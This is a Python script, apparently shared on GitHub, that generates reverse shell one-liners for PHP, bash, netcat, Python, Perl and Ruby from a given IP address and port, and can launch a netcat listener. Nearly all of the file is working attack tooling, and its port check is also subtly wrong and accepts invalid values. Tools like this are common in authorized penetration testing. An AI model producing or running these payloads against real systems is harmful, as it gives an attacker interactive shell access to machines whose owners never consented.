#!/usr/bin/python3
import sys
import os
import random

#If you don't like typing -l everytime set this to True.
start_listener = False

script_help = """
  __ _ _  _(_)__| |___ _ _____ ____| |_  ___| | |  _ __ _  _ 
 / _` | || | / _| / / '_/ -_) V (_-< ' \/ -_) | |_| '_ \ || |
 \__, |\_,_|_\__|_\_\_| \___|\_//__/_||_\___|_|_(_) .__/\_, |
    |_|                                           |_|   |__/ 
    Made by: 10xJosh On GitHub
    
    
A quick reverse shell generator based off of Pentest Monkey's cheatsheet.
All formats utilize bash instead of sh.
    Format:
        -php:  Generate a PHP reverse shell
        -bash: Generate a Bash reverse shell
        -nc: Generate a reverse shell for versions of netcat
             that do not have the -e argument.
        -nc-e: Generate a Netcat reverse shell 
        -python: Generate a Python reverse shell
        -python3: Generate a Python3 reverse shell
        -perl: Generate a Perl reverse shell
        -ruby: Generate a Ruby reverse shell
    
    IP Address: The IP Address you want the shell to connect to.
    Port: Desired port (random by default)
    Listener: Enter -l to start the listener after the code is
              generated.
    
{0} <Format> <IP Address> <Port (optional)> <Listener>
Example: {0} bash 192.168.0.1 4444 -l
    """.format(sys.argv[0])

if len(sys.argv) < 3:
    print(script_help)
    sys.exit()
elif len(sys.argv) > 5:
    print(script_help)
    print("[!!!] Error: You entered too many arguments!")
    sys.exit()

if "-l" in sys.argv:
    start_listener = True


def start_nc():
    if start_listener == True:
        try:
            print("\n[*] Attempting to start Netcat...\n")
            os.system("nc -lvnp {}".format(port))
            sys.exit()
        except Exception as nc_exception:
            print("[*] Failed to start netcat listener")
            sys.exit()


program_format = sys.argv[1]
program_format = program_format.lower()
IPAddress = sys.argv[2]

try:
    port = int(sys.argv[3])
    if port <= 0 or port < 65535:
        pass
    else:
        print("[*] Randomizing port number...")
        port = random.randint(8081, 10000)
except Exception as index_error:
    print("[*] Randomizing port number...")
    port = random.randint(8081, 10000)

# a quick check to make sure user input isnt getting out of hand. invalid IPs will get through
if len(IPAddress) > 15 or len(IPAddress) < 7:
    print("[!!!] Your IP Address is incorrect")
    sys.exit()

if program_format == "php":
    print("Here is your php reverse shell:\nphp -r '$sock=fsockopen(\"" + IPAddress + "\"," + str(port) +
          ");exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
    start_nc()
elif program_format == "bash":
    print("Here is your bash reverse shell:\nbash -i >& /dev/tcp/" + IPAddress + "/" + str(port) + " 0>&1")
    start_nc()
elif program_format == "nc":
    print("Here is your nc reverse shell:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc " + IPAddress + " "
          + str(port) + " >/tmp/f")
    start_nc()
elif program_format == "nc-e":
    print("Here is your nc reverse shell:\nnc " + IPAddress + " " + str(port) + " -e /bin/bash")
    start_nc()
elif program_format == "python":
    print("Here is your Python reverse shell:\npython -c 'import socket,subprocess,os;s=socket.socket"
          "(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IPAddress +"\"," + str(port) +
          "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
    start_nc()
elif program_format == "python3":
    print("Here is your Python reverse shell:\npython3 -c 'import socket,subprocess,os;s=socket.socket"
          "(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IPAddress +"\"," + str(port) +
          "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
    start_nc()
elif program_format == "perl":
    print("Here is your Perl reverse shell:\nperl -e 'use Socket;$i=\"" + IPAddress + "\";$p=" + str(port) +
          ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))"
          "{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'")
    start_nc()
elif program_format == "ruby":
    print("Here is your Ruby reverse shell:\nruby -rsocket -e'f=TCPSocket.open(\""+ IPAddress + "\"," + str(port) +
          ").to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'")
    start_nc()
else:
    print(script_help)
    print("[*] Did you enter in a valid format?")
    sys.exit()
